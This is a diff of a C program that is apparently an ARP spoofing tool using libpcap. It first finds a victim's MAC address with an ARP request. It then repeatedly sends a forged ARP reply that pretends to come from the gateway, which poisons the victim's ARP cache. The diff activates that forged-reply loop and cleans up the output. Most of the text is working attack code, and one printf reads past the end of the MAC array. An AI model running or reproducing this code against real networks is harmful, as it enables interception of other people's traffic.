@@ -70,6 +70,7 @@ int gw_IP_Parsing (const unsigned char * gw_IP) {
 		close(arp_pipe[0]);		// close for-read fd
 		close(arp_pipe[1]);
 		system("/usr/sbin/netstat -n -r | grep default | awk '{print $2}'");	//In MAC OS, gate
+		exit(1);
 	}
 
 	else {
@@ -102,6 +103,7 @@ int own_IP_Parsing(const unsigned char * own_IP) {
 		close(arp_pipe[0]);		// close for-read fd
 		close(arp_pipe[1]);
 		system("/sbin/ifconfig -a | grep inet | grep broadcast | awk '{print $2}'");
+		exit(1);
 	}
 
 	else {
@@ -135,7 +137,8 @@ int own_MAC_Parsing (const unsigned char * own_MACaddr) {
 		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
 		close(arp_pipe[0]);		// close for-read fd
 		close(arp_pipe[1]);
-		system("/sbin/ifconfig -a | grep ether | awk '{print $2}'");	// program's 
+		system("/sbin/ifconfig -a | grep ether | awk '{print $2}'");	// ifconfig path in MAC OS X : /sbin/ifconfig
+		exit(1);
 	}
 
 	else {
@@ -206,6 +209,19 @@ int Make_ARP_Packet (unsigned char * packet, unsigned char * senderMAC, unsigned
 	return 0;
 }
 
+int PrintPacket(unsigned char * packet, int len) {
+	int i = 0;
+
+	for (i = 0; i < len; i++) {
+		if (i == 0)				printf("%02X ",   packet[0]);
+		else if ((i % 16) == 0)	printf("\n%02X ", packet[i]);
+		else if ((i % 8) == 0)	printf(" %02X ",  packet[i]);
+		else 					printf("%02X ",   packet[i]);
+	}
+	printf("\n");
+
+	return 0;
+}
 
 int main (int argc, char * argv[]) {
 	int i = 0;
@@ -270,31 +286,15 @@ int main (int argc, char * argv[]) {
 	
 
 	own_IP_Parsing(own_IP);			// using ifconfig program, get IP address of own system
-
 	own_MAC_Parsing(own_MACaddr);
-
-	Make_ARP_Packet(arp_packet, own_MACaddr, own_IP, broadcastMAC, victim_IP, ARP_REQEST);
-
-	for (i = 0; i < sizeof(arp_packet); i++) {
-		if (i == 0)				printf("%02X ",   arp_packet[0]);
-		else if ((i % 16) == 0)	printf("\n%02X ", arp_packet[i]);
-		else if ((i % 8) == 0)	printf(" %02X ",  arp_packet[i]);
-		else 					printf("%02X ",   arp_packet[i]);
-	}
-	printf("\n");
+	Make_ARP_Packet(arp_packet, own_MACaddr, own_IP, broadcastMAC, victim_IP, ARP_REQEST); // With this Request, get vicim's MAC address...
 
 	while (1) {
 		//packet
 		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));	//returns 0 if success
-		for (i = 0; i < sizeof(arp_packet); i++) {
-			if (i == 0)				printf("%02X ",   arp_packet[0]);
-			else if ((i % 16) == 0)	printf("\n%02X ", arp_packet[i]);
-			else if ((i % 8) == 0)	printf(" %02X ",  arp_packet[i]);
-			else 					printf("%02X ",   arp_packet[i]);
-		}	
-		printf("\n");
+		printf("[*]SENDING : ARP REQUEST Packet\n");
 
-		printf("capturing...\n");
+		printf("\nCapturing ARP REPLY from victim...\n");
 		packet = pcap_next(pcd, &header);
 
 		
@@ -306,31 +306,23 @@ int main (int argc, char * argv[]) {
 		if (ntohs(*((unsigned short *)ethheader.type)) != ETHER_PROTO_ARP) 
 			continue;
 
-		printf("ARP Analyzing...\n");
-		
-		for (i = 0; i < 4; i++)
-			printf("%02x ", packet[28+i]);
-		printf("\n");
-
-		for (i = 0; i < 4; i++)
-			printf("%02x ", victim_IP[i]);
-		printf("\n");
-
 		if ( memcmp(&packet[28], victim_IP, 4) == 0) {
 			memcpy(victim_MACaddr, ethheader.srcMACaddr, 6);
-			printf("victim_MAC address is : %02x:%02x:%02x:%02x:%02x:%02x\n", victim_MACaddr[0], victim_MACaddr[1], victim_MACaddr[2], victim_MACaddr[3], victim_MACaddr[4], victim_MACaddr[5],victim_MACaddr[6]);
+			printf("victim_MAC address : %02x:%02x:%02x:%02x:%02x:%02x\n", victim_MACaddr[0], victim_MACaddr[1], victim_MACaddr[2], victim_MACaddr[3], victim_MACaddr[4], victim_MACaddr[5],victim_MACaddr[6]);
 			break;
 		}
 
 	}
 
-//	Make_ARP_Packet (arp_packet, own_MACaddr, gw_IP, victim_MACaddr, victim_IP, ARP_REPLY);
+	printf("Sending forged ARP REPLY packet...(disguising as gateway)\n");	
+	Make_ARP_Packet (arp_packet, own_MACaddr, gw_IP, victim_MACaddr, victim_IP, ARP_REPLY);	
 
+	printf("[ ARP REPLY PACKET INFO ]\n");
+	PrintPacket(arp_packet, sizeof(arp_packet));
 
 	while (1) {
-		printf("Sending ARP_REPLY packet...\n");
-		Make_ARP_Packet (arp_packet, own_MACaddr, gw_IP, victim_MACaddr, victim_IP, ARP_REPLY);		
 		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
+		printf("...\n");
 		sleep(5);
 	}
 
